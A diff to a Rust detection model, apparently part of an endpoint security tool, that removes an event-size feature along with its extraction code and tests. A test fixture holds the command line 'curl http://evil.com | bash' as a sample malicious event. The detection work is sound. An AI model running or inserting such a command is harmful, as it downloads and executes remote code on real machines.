@@ -29,7 +29,7 @@ use crate::information;
 use crate::types::{DetectionSignals, EventClass, TelemetryEvent};
 
 /// Number of features in the model's input vector.
-pub const FEATURE_COUNT: usize = 20;
+pub const FEATURE_COUNT: usize = 19;
 
 /// Feature names for interpretability / logging.
 pub const FEATURE_NAMES: [&str; FEATURE_COUNT] = [
@@ -53,7 +53,6 @@ pub const FEATURE_NAMES: [&str; FEATURE_COUNT] = [
     "cmdline_min_entropy",     // Min-entropy — detects deterministic components
     "cmdline_entropy_gap",     // H₁ - H_∞ gap — flat = random/encrypted, steep = structured
     "dns_entropy",             // Shannon entropy of domain label (DGA/tunneling signal)
-    "event_size_norm",         // event size normalized
 ];
 
 // ─── Model ──────────────────────────────────────────────────────
@@ -213,7 +212,6 @@ impl Default for MlModel {
                 0.5,   // cmdline_min_entropy      — low min-entropy = predictable pattern
                 0.6,   // cmdline_entropy_gap      — flat spectrum = random/encrypted
                 0.7,   // dns_entropy             — high-entropy labels (DGA/tunnel)
-                0.5,   // event_size_norm          — large events are higher risk
             ],
             bias: -3.6,    // slight bias shift for dns_entropy
             threshold: 0.5,
@@ -289,12 +287,6 @@ impl MlFeatures {
         if let Some(domain) = &event.dst_domain {
             values[18] = information::dns_entropy(domain);
         }
-
-        let size_norm = event
-            .event_size
-            .map(|size| ((size as f64) / 1_048_576.0).min(1.0))
-            .unwrap_or(0.0);
-        values[19] = size_norm;
 
         Self { values }
     }
@@ -483,18 +475,16 @@ mod tests {
             ppid: 1,
             uid,
             process: "bash".to_string(),
-        parent_process: "sshd".to_string(),
-        session_id: 1,
-        file_path: None,
-        file_write: false,
-        file_hash: None,
-        dst_port,
-        dst_ip: None,
-        dst_domain: None,
-        command_line: Some("curl http://evil.com | bash".to_string()),
-        event_size: None,
+            parent_process: "sshd".to_string(),
+            session_id: 1,
+            file_path: None,
+            file_hash: None,
+            dst_port,
+            dst_ip: None,
+            dst_domain: None,
+            command_line: Some("curl http://evil.com | bash".to_string()),
+        }
     }
-}
 
     #[test]
     fn default_model_validates() {
@@ -529,26 +519,6 @@ mod tests {
         let result = engine.score(&features);
         assert!(result.score < 0.3, "clean event should score low: {}", result.score);
         assert!(!result.positive);
-    }
-
-    #[test]
-    fn event_size_is_normalized() {
-        let signals = DetectionSignals {
-            z1_exact_ioc: false,
-            z2_temporal: false,
-            z3_anomaly_high: false,
-            z3_anomaly_med: false,
-            z4_kill_chain: false,
-            l1_prefilter_hit: false,
-        };
-        let mut event = make_event(EventClass::FileOpen, 1000, None);
-        event.event_size = Some(512 * 1024);
-        let features = MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
-        assert!((features.values[19] - 0.5).abs() < 1e-6);
-
-        event.event_size = Some(2 * 1024 * 1024);
-        let features2 = MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
-        assert!((features2.values[19] - 1.0).abs() < 1e-6);
     }
 
     #[test]
@@ -707,7 +677,6 @@ mod tests {
         // Features NOT in CI model should be 0.0
         assert_eq!(model.weights[9], 0.0, "missing feature should be 0.0"); // dst_port_risk
         assert_eq!(model.weights[14], 0.0, "info-theoretic features should be 0.0"); // cmdline_renyi_h2
-        assert_eq!(model.weights[19], 0.0, "missing feature should be 0.0"); // event_size_norm
 
         // Model should be valid and usable
         model.validate().unwrap();
